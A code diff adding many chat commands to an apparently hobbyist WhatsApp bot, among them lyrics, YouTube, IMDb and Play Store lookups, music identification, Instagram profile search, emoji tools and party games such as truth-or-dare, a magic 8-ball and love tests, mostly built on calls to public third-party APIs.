+            return reply(`🎵 *Lyrics Finder*\n\nUsage: ${prefix}lyrics <song name>\n\nExamples:\n• ${prefix}lyrics shape of you\n• ${prefix}lyrics Sekkle down by bunnie Gunter\n• ${prefix}lyrics Blinding Lights The Weeknd`);
+        }
+
+        try {
+            await reply(`🔍 Searching lyrics for: *"${text}"*...`);
+
+            let lyricsData;
+            let success = false;
+
+            // Try primary API first (popcat)
+            try {
+                const apiUrl = `https://api.popcat.xyz/v2/lyrics?song=${encodeURIComponent(text)}`;
+                const res = await fetch(apiUrl, { timeout: 15000 });
+                
+                if (!res.ok) throw new Error(`API status: ${res.status}`);
+                
+                const data = await res.json();
+
+                if (data.error !== true && data.message && typeof data.message === 'object' && data.message.lyrics) {
+                    lyricsData = data.message;
+                    success = true;
+                } else {
+                    throw new Error('Primary API returned no lyrics');
+                }
+            } catch (primaryError) {
+                console.log('Primary API failed, trying fallback API...');
+                
+                // Fallback to new API
+                const fallbackUrl = `https://api.nexray.eu.cc/search/lyrics?q=${encodeURIComponent(text)}`;
+                const fallbackRes = await fetch(fallbackUrl);
+                const fallbackData = await fallbackRes.json();
+                
+                if (fallbackData.status && fallbackData.result && fallbackData.result.lyrics) {
+                    lyricsData = {
+                        title: fallbackData.result.title,
+                        artist: fallbackData.result.artist,
+                        lyrics: fallbackData.result.lyrics.plain_lyrics || fallbackData.result.lyrics.synced_lyrics,
+                        image: fallbackData.result.thumbnail
+                    };
+                    success = true;
+                } else {
+                    throw new Error('Fallback API also failed');
+                }
+            }
+
+            if (!success || !lyricsData) {
+                return reply(`No lyrics found for *"${text}"*\n\nTry:\n• Add artist name\n• Check spelling\n• Use exact title`);
+            }
+
+            const lyrics = lyricsData.lyrics;
+            const artist = lyricsData.artist || 'Unknown';
+            const title = lyricsData.title || text;
+            const image = lyricsData.image;
+
+            // Clean up lyrics (remove "Contributor" line if present)
+            const cleanLyrics = lyrics.replace(/^\d+\s+Contributor.*?\n/i, '');
+
+            // Format message (max 4000 chars for WhatsApp)
+            let message = `🎵 *${title}*\n🎤 *Artist:* ${artist}\n\n📖 *Lyrics:*\n\n${cleanLyrics}`;
+            
+            if (message.length > 3500) {
+                message = message.substring(0, 3500) + '\n\n*Lyrics truncated - song too long*';
+            }
+            
+            message += `\n\n${global.wm || ''}`;
+
+            // Send image first if available
+            if (image && typeof image === 'string' && image.includes('http') && !image.includes('default_cover_image')) {
+                try {
+                    await conn.sendMessage(m.chat, {
+                        image: { url: image },
+                        caption: `🎵 *${title}*\n🎤 *Artist:* ${artist}`
+                    }, { quoted: m });
+                    
+                    // Small delay
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                } catch (e) {
+                    console.log('Image failed:', e.message);
+                }
+            }
+
+            // Send lyrics
+            await conn.sendMessage(m.chat, { text: message }, { quoted: m });
+
+        } catch (error) {
+            console.error('Lyrics error:', error);
+            
+            let errMsg = `Error: ${error.message}`;
+            if (error.message.includes('timeout')) errMsg = 'Request timed out';
+            if (error.message.includes('network')) errMsg = 'Network error';
+            if (error.message.includes('status: 5')) errMsg = 'Service unavailable';
+            
+            reply(`${errMsg}\n\nTry again in a few moments!`);
+        }
+}
+break
+case 'playstore': { 
+const query = args.join(" ");   
+    if (!query) {
+        return reply("*Please provide an app name to search. Example: !playstore whatsapp*");
+    }
+    
+    try {
+        const apiUrl = `https://api.princetechn.com/api/search/playstore?apikey=${global.princetechn || 'prince'}&query=${encodeURIComponent(query)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 10000 });
+        
+        if (data && data.success && data.results && data.results.length > 0) {
+            const app = data.results[0];
+            const resultText = `Name: ${app.name}\nDeveloper: ${app.developer}\nApp ID: ${app.appId}\nRating: ${app.rating}\nSummary: ${app.summary}\nLink: ${app.link}\nDeveloper Link: ${app.link_dev}`;
+            reply(resultText);
+        } else {
+            reply(`No apps found for "${query}".`);
+        }
+    } catch (error) {
+        console.error('Playstore error:', error.message);
+        reply("Error searching Play Store. Please try again later!");
+    }
+    
+}
+break
+case "yts": 
+case "ytsearch": {
+    if (!text) return reply(`📌 *Example: ${prefix + command} Eminem Godzilla*`);
+
+      try {
+        const searchResults = await yts(text);
+        if (!searchResults.all.length) return reply("❌ *No YouTube results found.*");
+
+        let responseText = `🎥 *YouTube Search Results for:* ${text}\n\n`;
+        searchResults.all.slice(0, 10).forEach((video, index) => {
+          responseText += `□ *${index + 1}.* ${video.title}\n□ *Uploaded:* ${video.ago}\n□ *Views:* ${video.views}\n□ *Duration:* ${video.timestamp}\n□ *URL:* ${video.url}\n\n─────────────────\n\n`;
+        });
+
+        await conn.sendMessage(
+          m.chat,
+          { image: { url: searchResults.all[0].thumbnail }, caption: responseText },
+          { quoted: m }
+        );
+      } catch (error) {
+        console.error("YT Search command failed:", error);
+        reply("❌ *An error occurred while fetching YouTube search results.*");
+      }
+}
+break
+case "yts2": {
+    const query = args.join(' ');
+    
+    if (!query) return reply("*Please provide a search term. Example: `.yts2 JEXPLOIT-BOT*`");
+    
+    try {
+      const response = await fetch(`${global.siputzx}/api/s/youtube?query=${encodeURIComponent(query)}`);
+      const data = await response.json();
+      
+      if (!data.status || !data.data || data.data.length === 0) {
+        return reply(`❌ No videos found for "${query}"`);
+      }
+      
+      const videos = data.data.slice(0, 5); // Show first 5 results
+      
+      let message = `📺 *YouTube Search Results for "${query}"*\n\n`;
+      
+      videos.forEach((video, index) => {
+        message += `*${index + 1}. ${video.title}*\n`;
+        message += `   👤 Channel: ${video.author?.name || 'Unknown'}\n`;
+        message += `   ⏱️ Duration: ${video.timestamp || 'N/A'}\n`;
+        message += `   👁️ Views: ${video.views?.toLocaleString() || 'N/A'}\n`;
+        message += `   📅 Uploaded: ${video.ago || 'N/A'}\n`;
+        message += `   🔗 Link: ${video.url}\n\n`;
+      });
+      
+      message += `> ${global.wm || ''}`;
+      
+      reply(message);
+      
+    } catch (error) {
+      console.error('YouTube search error:', error);
+      reply("❌ Error searching YouTube. Try again later.");
+    }
+}
+break
+case 'ytplay':
+case 'ytaudio': {
+    await ytplayCommand(conn, m.chat, text, m);
+   
+}
+break
+case "imdb":
+case "movie": {
+if (!text) return reply("Provide a movie or series name.");
+      
+      try {
+        const { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
+        if (data.Response === "False") throw new Error();
+
+        const imdbText = `🎬 *IMDB SEARCH*\n\n`
+          + `*Title:* ${data.Title}\n*Year:* ${data.Year}\n*Rated:* ${data.Rated}\n`
+          + `*Released:* ${data.Released}\n*Runtime:* ${data.Runtime}\n*Genre:* ${data.Genre}\n`
+          + `*Director:* ${data.Director}\n*Actors:* ${data.Actors}\n*Plot:* ${data.Plot}\n`
+          + `*IMDB Rating:* ${data.imdbRating} ⭐\n*Votes:* ${data.imdbVotes}`;
+
+        conn.sendMessage(m.chat, { image: { url: data.Poster }, caption: imdbText }, { quoted: m });
+      } catch (error) {
+        reply("❌ Unable to fetch IMDb data.");
+      }
+}
+break
+case 'define': {
+    const term = args.join(' ');
+    
+    if (!term) {
+        return reply("*Please provide a word to define. Example: !define dog*");
+    }
+    
+    try {
+        const apiUrl = `https://api.princetechn.com/api/tools/define?apikey=${global.princetechn || 'prince'}&term=${encodeURIComponent(term)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 10000 });
+        
+        if (data && data.success && data.results && data.results.length > 0) {
+            const firstResult = data.results[0];
+            const resultText = `Word: ${firstResult.word}\n\nDefinition: ${firstResult.definition}\n\nExample: ${firstResult.example}`;
+            reply(resultText);
+        } else {
+            reply(`No definition found for "${term}".`);
+        }
+    } catch (error) {
+        console.error('Define error:', error.message);
+        reply("Error fetching definition. Please try again later!");
+    }
+    
+}
+break
+case "shazam": {
+ const quoted = m.quoted ? m.quoted : null || m.msg ;
+ const mime = quoted?.mimetype || ""; 
+      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
+      
+try {
+    const media = await m.quoted.download();
+    const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
+    fs.writeFileSync(filePath, media);
+    const res = await acr.identify(fs.readFileSync(filePath));
+    if (res.status.code != 0) throw new Error(res.status.msg);
+
+    //  this check before accessing music[0]
+    if (!res.metadata?.music || res.metadata.music.length === 0) {
+        return reply("No music identified in this audio/video.");
+    }
+
+    const { title, artists, album, release_date } = res.metadata.music[0];
+    const resultText = `  *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n*Album:* ${album?.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;
+    
+    reply(resultText);
+} catch (error) {
+    console.error(error);
+    reply("Error identifying music: " + error.message);
+      }
+}
+break
+case "instagramuser":
+case "iguser": {
+const username = args[0];
+        
+        if (!username) return reply("*Please provide an Instagram username. Example: `.iguser siputzx_*`");
+        
+        try {
+            await reply(`🔍 Searching for @${username}...`);
+            
+            const response = await fetch(`${global.mess.siputzx}/api/d/igram?url=${encodeURIComponent(username)}`);
+            const data = await response.json();
+            
+            if (!data.status || !data.data?.result?.length) {
+                return reply(`❌ User "@${username}" not found.`);
+            }
+            
+            const user = data.data.result[0].user;
+            
+            let message = `*📸 INSTAGRAM PROFILE*\n\n`;
+            message += `👤 *Username:* @${user.username}\n`;
+            message += `📛 *Name:* ${user.full_name || 'Not set'}\n`;
+            message += `📝 *Bio:* ${user.biography || 'No bio'}\n`;
+            message += `🔗 *Website:* ${user.external_url || 'None'}\n\n`;
+            message += `👥 *Followers:* ${user.follower_count?.toLocaleString() || 0}\n`;
+            message += `👣 *Following:* ${user.following_count?.toLocaleString() || 0}\n`;
+            message += `📹 *Posts:* ${user.media_count?.toLocaleString() || 0}\n`;
+            message += `🔒 *Private:* ${user.is_private ? 'Yes' : 'No'}\n`;
+            message += `✅ *Verified:* ${user.is_verified ? 'Yes' : 'No'}\n\n`;
+            
+            if (user.profile_pic_url) {
+                await conn.sendMessage(m.chat, {
+                    image: { url: user.profile_pic_url },
+                    caption: message
+                }, { quoted: m });
+            } else {
+                reply(message);
+            }
+            
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+            
+        } catch (error) {
+            console.error('Instagram user error:', error);
+            reply("❌ Error fetching Instagram profile. Try again later.");
+            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        }
+}
+break
+case 'chord':
+case 'cr': {
+  if(!text) return m.reply(`*query input*`);
+  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
+  const res = await fetch(anu)
+  const response = await res.json();
+  m.reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
+}
+break
+case "dares":
+case "dare": {
+
+    await dareCommand(conn, from, m);
+    
+}
+break
+case "truth": {
+
+    await truthCommand(conn, from, m);
+    
+}
+break
+case "truthdetecter": {
+   if (!m.quoted) return reply(`Please reply to the message you want to detect!`);
+
+    let responses = [
+      "That's a blatant lie!",
+      "Truth revealed!",
+      "Lie alert!",
+      "Hard to believe, but true!",
+      "Professional liar detected!",
+      "Fact-check: TRUE",
+      "Busted! That's a lie!",
+      "Unbelievable, but FALSE!",
+      "Detecting... TRUTH!",
+      "Lie detector activated: FALSE!",
+      "Surprisingly, TRUE!",
+      "My instincts say... LIE!",
+      "That's partially true!",
+      "Can't verify, try again!",
+      "Most likely, TRUE!",
+      "Don't believe you!",
+      "Surprisingly, FALSE!",
+      "Truth!",
+      "Honest as a saint!",
+      "Deceptive much?",
+      "Absolutely true!",
+      "Completely false!",
+      "Seems truthful.",
+      "Not buying it!",
+      "You're lying through your teeth!",
+      "Hard to believe, but it's true!",
+      "I sense honesty.",
+      "Falsehood detected!",
+      "Totally legit!",
+      "Lies, lies, lies!",
+      "You can't fool me!",
+      "Screams truth!",
+      "Fabrication alert!",
+      "Spot on!",
+      "Fishy story, isn't it?",
+      "Unquestionably true!",
+      "Pure fiction!"
+    ];
+
+    let result = responses[Math.floor(Math.random() * responses.length)];
+    let replyText = `*RESULT*: ${result}`;
+
+    await reply(replyText);
+}
+break
+case "fact": {
+    try {
+      const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
+      return reply(`*FACT:* ${data.fact}\n`);
+    } catch (err) {
+      console.error(err);
+      return reply('*An error occurred while fetching the fact.*');
+    }
+}
+break
+case "truth": {
+const truths = [
+      "What's your biggest fear?",
+      "Have you ever lied to your best friend?",
+      "What's your deepest secret?",
+      "Who's your secret crush?",
+      "What's the biggest mistake you've ever made?",
+      "Have you ever cheated on a test?",
+      "What's the most embarrassing thing that's ever happened to you?",
+      "Do you have a hidden talent?",
+      "What's the biggest lie you've ever told?",
+      "Have you ever been in love?",
+      "What's the most spontaneous thing you've ever done?",
+      "Who's the person you trust most?",
+      "What's the biggest risk you've ever taken?",
+      "Have you ever regretted something?",
+      "What's the most memorable gift you've received?",
+      "Have you ever had a crush on someone older?",
+      "What's the biggest lesson you've learned?",
+      "Have you ever broken someone's heart?",
+      "What's the most exciting thing you've done?",
+      "Do you believe in soulmates?",
+      "What's the biggest challenge you've faced?",
+      "Have you ever kept a secret from your parents?",
+      "What's the most creative thing you've done?",
+      "Have you ever felt betrayed?",
+      "What's the biggest adventure you've been on?",
+      "Have you ever had a rival?",
+      "What's the most thoughtful thing someone's done for you?",
+      "Have you ever forgiven someone?",
+      "What's the biggest obstacle you've overcome?",
+      "Do you believe in karma?",
+      "What's the most romantic thing someone's done for you?",
+      "Have you ever taken a risk for love?",
+      "What's the biggest surprise you've ever received?",
+      "Have you ever had a paranormal experience?",
+      "What's the most inspiring story you've heard?",
+      "Have you ever helped someone in need?",
+      "What's the biggest accomplishment you're proud of?",
+    ];
+
+    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
+    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');
+
+    await conn.sendMessage(
+      from,
+      {
+        image: buffer,
+        caption: `*TRUTH*\n${truthMessage}`,
+      },
+      { quoted: m }
+     );
+        
+}
+break
+case 'guesscartoon':
+case 'cartoonquiz':
+case 'guesscharacter':
+    try {
+        await m.reply("🎮 Fetching a cartoon character...");
+        
+        const response = await fetch(`${global.mess.siputzx}/api/games/tebakkartun`);
+        const data = await response.json();
+        
+        if (!data.status || !data.data) {
+            return m.reply("*Failed to fetch cartoon character.*");
+        }
+        
+        await conn.sendMessage(m.chat, {
+            image: { url: data.data.img },
+            caption: `🎪 *GUESS THE CARTOON CHARACTER!*\n\nCan you name this character?\n\nReply with your answer!`
+        }, { quoted: m });
+        
+    } catch (error) {
+        console.error('Game error:', error);
+        m.reply("❌ Error fetching cartoon game.");
+    }
+  
+break
+case "compatibility":
+case "comp": {
+    try {
+        // Check if two users are mentioned
+        if (!m.mentionedJid || m.mentionedJid.length < 2) {
+            return reply("Please mention two users to calculate compatibility.\nUsage: `.compatibility @user1 @user2`");
+        }
+
+        const [user1, user2] = m.mentionedJid.slice(0, 2);
+        
+        // Calculate random compatibility score (1-1000)
+        let compatibilityScore = Math.floor(Math.random() * 1000) + 1;
+
+        // Special case for bot owner (replace '256742932677' with your actual owner number)
+        const ownerNumber = "256742932677@s.whatsapp.net";
+        if (user1 === ownerNumber || user2 === ownerNumber) {
+            compatibilityScore = 1000;
+        }
+
+        // Format the response
+        const resultMessage = 
+            `💖 *Compatibility Result* 💖\n\n` +
+            `@${user1.split('@')[0]} ❤️ @${user2.split('@')[0]}\n` +
+            `Score: ${compatibilityScore}/1000\n\n` +
+            `${getCompatibilityMessage(compatibilityScore)}`;
+
+        // Send the result
+        await conn.sendMessage(
+            m.chat,
+            { 
+                text: resultMessage,
+                mentions: [user1, user2]
+            },
+            { quoted: m }
+        );
+
+    } catch (error) {
+        console.error('Error in compatibility command:', error);
+        reply(`❌ Error: ${error.message}`);
+    }
+    break;
+}
+
+// Helper function to get a fun message based on score
+function getCompatibilityMessage(score) {
+    if (score >= 900) return "Soulmates! 💞 You're perfect for each other!";
+    if (score >= 700) return "Great match! 💕 You complement each other well.";
+    if (score >= 500) return "Good potential! 💗 With some work, this could be great.";
+    if (score >= 300) return "Not bad! 💖 There's some chemistry here.";
+    return "Might need some work... 💔 But don't give up!";
+}
+break
+case "compliment": {
+let compliments = [
+        "You're amazing just the way you are! 💖",
+        "You light up every room you walk into! 🌟",
+        "Your smile is contagious! 😊",
+        "You're a genius in your own way! 🧠",
+        "You bring happiness to everyone around you! 🥰",
+        "You're like a human sunshine! ☀️",
+        "Your kindness makes the world a better place! ❤️",
+        "You're unique and irreplaceable! ✨",
+        "You're a great listener and a wonderful friend! 🤗",
+        "Your positive vibes are truly inspiring! 💫",
+        "You're stronger than you think! 💪",
+        "Your creativity is beyond amazing! 🎨",
+        "You make life more fun and interesting! 🎉",
+        "Your energy is uplifting to everyone around you! 🔥",
+        "You're a true leader, even if you don’t realize it! 🏆",
+        "Your words have the power to make people smile! 😊",
+        "You're so talented, and the world needs your skills! 🎭",
+        "You're a walking masterpiece of awesomeness! 🎨",
+        "You're proof that kindness still exists in the world! 💕",
+        "You make even the hardest days feel a little brighter! ☀️"
+    ];
+
+    let randomCompliment = compliments[Math.floor(Math.random() * compliments.length)];
+    let sender = `@${mek.sender.split("@")[0]}`;
+    let mentionedUser = m.mentionedJid[0] || (mek.quoted && mek.quoted.sender);
+    let target = mentionedUser ? `@${mentionedUser.split("@")[0]}` : "";
+
+    let message = mentionedUser 
+        ? `${sender} complimented ${target}:\n😊 *${randomCompliment}*`
+        : `${sender}, you forgot to tag someone! But hey, here's a compliment for you:\n😊 *${randomCompliment}*`;
+
+    await conn.sendMessage(mek.chat, { text: message, mentions: [mek.sender, mentionedUser].filter(Boolean) }, { quoted: mek });
+}
+break
+case "8balls": {
+    if (!q) return reply("🎱 *Magic 8-Ball*\n\nAsk a yes/no question!\n\n📝 *Example:* .8ball Will I be rich?");
+    
+    const responses = [
+        "Yes, definitely! 🎯",
+        "No way! ❌",
+        "Ask again later. ⏳",
+        "It is certain. ✅",
+        "Very doubtful. 🤔",
+        "Without a doubt. 💯",
+        "My reply is no. 🚫",
+        "Signs point to yes. ✨",
+        "Maybe... 😐",
+        "Absolutely! 🔥",
+        "Better not tell you now. 🤫",
+        "Cannot predict now. 🌙",
+        "Concentrate and ask again. 🧘",
+        "Don't count on it. 📉",
+        "Most likely. 📈",
+        "Outlook good. 🌟",
+        "Outlook not so good. 🌧️",
+        "Yes - without a doubt. 🎯"
+    ];
+    
+    const answer = responses[Math.floor(Math.random() * responses.length)];
+    const text = `🎱 *Magic 8-Ball*\n\n❓ *Question:* ${q}\n\n💬 *Answer:* ${answer}\n\n🎲 *Roll again with* .8ball ${q}`;
+    
+    // Send directly without buttons
+    await conn.sendMessage(m.chat, {
+        text: text
+    }, { quoted: m });
+    
+    await conn.sendMessage(m.chat, {
+        react: { text: '🎱', key: m.key }
+    });
+    
+   
+}
+break
+case "lovetest": {
+if (args.length < 2) return reply("Tag two users! Example: .lovetest @user1 @user2");
+
+    let user1 = args[0].replace("@", "") + "@s.whatsapp.net";
+    let user2 = args[1].replace("@", "") + "@s.whatsapp.net";
+
+    let lovePercent = Math.floor(Math.random() * 100) + 1; // Generates a number between 1-100
+
+    let messages = [
+        { range: [90, 100], text: "💖 *A match made in heaven!* True love exists!" },
+        { range: [75, 89], text: "😍 *Strong connection!* This love is deep and meaningful." },
+        { range: [50, 74], text: "😊 *Good compatibility!* You both can make it work." },
+        { range: [30, 49], text: "🤔 *It’s complicated!* Needs effort, but possible!" },
+        { range: [10, 29], text: "😅 *Not the best match!* Maybe try being just friends?" },
+        { range: [1, 9], text: "💔 *Uh-oh!* This love is as real as a Bollywood breakup!" }
+    ];
+
+    let loveMessage = messages.find(msg => lovePercent >= msg.range[0] && lovePercent <= msg.range[1]).text;
+
+    let message = `💘 *Love Compatibility Test* 💘\n\n❤️ *@${user1.split("@")[0]}* + *@${user2.split("@")[0]}* = *${lovePercent}%*\n${loveMessage}`;
+
+    await conn.sendMessage(mek.chat, { text: message, mentions: [user1, user2] }, { quoted: mek });
+}
+break
+case "emoji": {
+try {
+            // Join the words together in case the user enters multiple words
+            let text = args.join(" ");
+            
+            // Map text to corresponding emoji characters
+            let emojiMapping = {
+                "a": "🅰️",
+                "b": "🅱️",
+                "c": "🇨️",
+                "d": "🇩️",
+                "e": "🇪️",
+                "f": "🇫️",
+                "g": "🇬️",
+                "h": "🇭️",
+                "i": "🇮️",
+                "j": "🇯️",
+                "k": "🇰️",
+                "l": "🇱️",
+                "m": "🇲️",
+                "n": "🇳️",
+                "o": "🅾️",
+                "p": "🇵️",
+                "q": "🇶️",
+                "r": "🇷️",
+                "s": "🇸️",
+                "t": "🇹️",
+                "u": "🇺️",
+                "v": "🇻️",
+                "w": "🇼️",
+                "x": "🇽️",
+                "y": "🇾️",
+                "z": "🇿️",
+                "0": "0️⃣",
+                "1": "1️⃣",
+                "2": "2️⃣",
+                "3": "3️⃣",
+                "4": "4️⃣",
+                "5": "5️⃣",
+                "6": "6️⃣",
+                "7": "7️⃣",
+                "8": "8️⃣",
+                "9": "9️⃣",
+                " ": "␣", // for space
+            };
+
+            // Convert the input text into emoji form
+            let emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");
+
+            // If no valid text is provided
+            if (!text) {
+                return reply("Please provide some text to convert into emojis!");
+            }
+
+            await conn.sendMessage(mek.chat, {
+                text: emojiText,
+            }, { quoted: mek });
+
+        } catch (error) {
+            console.log(error);
+            reply(`Error: ${error.message}`);
+        }
+}
+break
+case "emojimix":
+case "mixemoji":
+case "emix": {
+    if (!text) return reply(`🎨 *EMOJI MIXER*\n\nMix two emojis to create a new one!\n\n*Usage:*\n${prefix}emojimix 🥺 🤔\n${prefix}emix 😂 🥲\n${prefix}emojimix 🔥 💀\n\n*Example:*\n${prefix}emojimix 🥺 🤔`);
+
+    // Extract two emojis from text
+    const emojiRegex = /[\p{Emoji}\uFE0F\u20E3]/gu;
+    const emojis = text.match(emojiRegex);
+    
+    if (!emojis || emojis.length < 2) {
+        return reply(`❌ *Please provide TWO emojis!*\n\nExample: ${prefix}emojimix 😂 🥲`);
+    }
+
+    const emoji1 = emojis[0];
+    const emoji2 = emojis[1];
+
+    await reply(`🔍 *Mixing ${emoji1} + ${emoji2}...*`);
+    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });
+
+    try {
+        const apiUrl = `https://api.nexray.eu.cc/tools/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`;
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 15000
+        });
+
+        // Check if response is an image
+        const contentType = response.headers['content-type'];
+        if (contentType && contentType.includes('image')) {
+            await conn.sendMessage(m.chat, {
+                image: Buffer.from(response.data),
+                caption: `🎨 *Emoji Mix Result*\n\n${emoji1} + ${emoji2} = ?`
+            }, { quoted: m });
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+        } else {
+            throw new Error('Invalid response from API');
+        }
+
+    } catch (error) {
+        console.error('Emojimix error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply(`❌ *Failed to mix emojis.*\n\nPlease try different emojis or try again later.`);
+    }
+    
+}
+break
+case "emojigif":
+case "egif":
+case "emojitogif": {
+    if (!text) return reply(`🎨 *EMOJI TO GIF*\n\nConvert an emoji to an animated GIF!\n\n*Usage:*\n${prefix}emojigif 😂\n${prefix}egif 🥺\n${prefix}emojitogif 🔥\n\n*Example:*\n${prefix}emojigif 🤣`);
+
+    // Extract emoji from text
+    const emojiRegex = /[\p{Emoji}\uFE0F\u20E3]/gu;
+    const emojis = text.match(emojiRegex);
+    
+    if (!emojis || emojis.length === 0) {
+        return reply(`*Please provide an emoji!*\n\nExample: ${prefix}emojigif 😂`);
+    }
+
+    const emoji = emojis[0];
+
+    await reply(`*Converting ${emoji} to GIF...*`);
+    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });
+
+    try {
+        const apiUrl = `https://api.nexray.eu.cc/tools/emojigif?emoji=${encodeURIComponent(emoji)}`;
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 15000
+        });
+
+        const contentType = response.headers['content-type'];
+        if (contentType && contentType.includes('image/gif')) {
+            await conn.sendMessage(m.chat, {
+                video: Buffer.from(response.data), // GIF as video
+                caption: `> ${global.wm}`,
+                gifPlayback: true,
+                mimetype: 'video/mp4'
+            }, { quoted: m });
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+        } else {
+            await conn.sendMessage(m.chat, {
+                image: Buffer.from(response.data),
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+        }
+
+    } catch (error) {
+        console.error('Emoji GIF error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply(`❌ *Failed to convert emoji to GIF.*\n\nPlease try a different emoji or try again later.`);
+    }
+    
+}
+break
+case "removebg":
+case "removebackground":
+case "rmbg": {
+    if (!quoted || !/image/.test(mime)) {
+        return reply(`*🖼️ REMOVE BACKGROUND*\n\nReply to an image with this command to remove its background.\n\n*Usage:*\n${prefix}removebg (reply to an image)\n${prefix}rmbg (reply to an image)\n\n*Example:* Reply to an image with .removebg`);
+    }
+
+    await reply(`🖼️ *Processing image...*\n\n⏳ Removing background, please wait...`);
+    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });
+
+    try {
+        // Upload image to catbox
+        const imageUrl = await handleMediaUpload(quoted, conn, mime);
+        
+        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
+            return reply(`*Failed to upload image!*\n\nPlease try again with a smaller image.`);
+        }
+
+        const apiUrl = `https://api.nexray.eu.cc/tools/removebg?url=${encodeURIComponent(imageUrl)}`;
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 30000
+        });
+
+        const contentType = response.headers['content-type'];
+        
+        if (contentType && contentType.includes('image')) {
+            await conn.sendMessage(m.chat, {
+                image: Buffer.from(response.data),
+                caption: `✅ *Background removed successfully!*`
+            }, { quoted: m });
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+        } else {
+            throw new Error('Invalid response from API');
+        }
+
+    } catch (error) {
+        console.error('RemoveBG error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply(`*Failed to remove background!*\n\nPlease try again with a different image.`);
+    }
+   
+}
+break
+case 'joke': {
+    try {
+        const apiUrl = `https://api.princetechn.com/api/fun/jokes?apikey=${global.princetechn || 'prince'}`;
+        const { data } = await axios.get(apiUrl, { timeout: 10000 });
+        
+        if (data && data.success && data.result) {
+            const joke = data.result;
+            const jokeText = `${joke.setup}\n\n${joke.punchline}`;
+            await conn.sendMessage(from, { text: jokeText }, { quoted: m });
+        } else {
+            await conn.sendMessage(from, { text: "Couldn't fetch a joke. Please try again!" }, { quoted: m });
+        }
+    } catch (error) {
+        console.error('Joke error:', error.message);
+        await conn.sendMessage(from, { text: "Error fetching joke. Try again later!" }, { quoted: m });
+    }
+    
+}
+break
+case "valentines": {
+    try {
+            const axios = require('axios');
+            const apiUrl = `https://api.princetechn.com/api/fun/valentines?apikey=prince`;
+            const response = await axios.get(apiUrl);
+            
+            if (response.data?.success && response.data?.result) {
+                reply(response.data.result);
+            } else {
+                reply('Failed to fetch valentine message.');
+            }
+        } catch (error) {
+            console.error('Valentine error:', error);
+            reply('Error fetching valentine message.');
+        }
+}
+break
+case "pickupline": {
+try {
+        // Fetch pickup line from the API
+        const res = await fetch('https://api.popcat.xyz/pickuplines');
+        
+        if (!res.ok) {
+            throw new Error(`API request failed with status ${res.status}`);
+        }
+
+        const json = await res.json();
+        console.log('JSON response:', json);
+
+        // Format the pickup line message
+        const pickupLine = `*Here's a pickup line for you:*\n\n"${json.pickupline}"\n\n> *© ᴅʀᴏᴘᴘᴇᴅ ʙʏ ${global.botname}*`;
+
+        // Send the pickup line to the chat
+        await conn.sendMessage(from, { text: pickupLine }, { quoted: m });
+
+    } catch (error) {
+        console.error("Error in pickupline command:", error);
+        reply("Sorry, something went wrong while fetching the pickup line. Please try again later.");
+    }
+}
+break
+case "trivia": {
+try {
+      let res = await fetch("https://opentdb.com/api.php?amount=1");
+      let json = await res.json();
+
+      let question = json.results[0].question;
+      let answer = json.results[0].correct_answer;
+
+      await conn.sendMessage(m.chat, { text: `Question: ${question}\n\nThink you know the answer? Sending the correct answer after 20 seconds` }, { quoted: m });
+      
+      setTimeout(async () => {
+        await conn.sendMessage(m.chat, { text: `Answer: ${answer}` });
+      }, 20000); // 20 seconds
+    } catch (error) {
+      console.error('Error fetching trivia question:', error);
+      reply('An error occurred while fetching the trivia question.');
+    }
+}
+break
+case "riddle": {
+try {
+            await reply("🧩 *Loading riddle...*");
+            
+            const response = await fetch(`${global.mess.siputzx}/api/games/tekadek`);
+            const data = await response.json();
+            
+            if (!data.status || !data.data) {
+                return reply("Failed to fetch riddle. Try again later.");
+            }
+            
+            const { soal, jawaban } = data.data;
+            
+            let message = `*🧩 TEKA-TEKI / RIDDLE*\n\n`;
+            message += `❓ *Question:*\n${soal}\n\n`;
+            message += `💡 *Answer:* ||${jawaban}||\n\n`;
+            message += `_Reply with .riddle to get another riddle_`;
+            
+            reply(message);
+            
+        } catch (error) {
+            console.error('Riddle error:', error);
+            reply("Error fetching riddle. Try again later.");
+        }
+}
+break
+case "advice": {
+    try {
+       const apiUrl = `https://api.princetechn.com/api/fun/advice?apikey=prince`;
+            const response = await axios.get(apiUrl);
+            
+            if (response.data?.success && response.data?.result) {
+                reply(response.data.result);
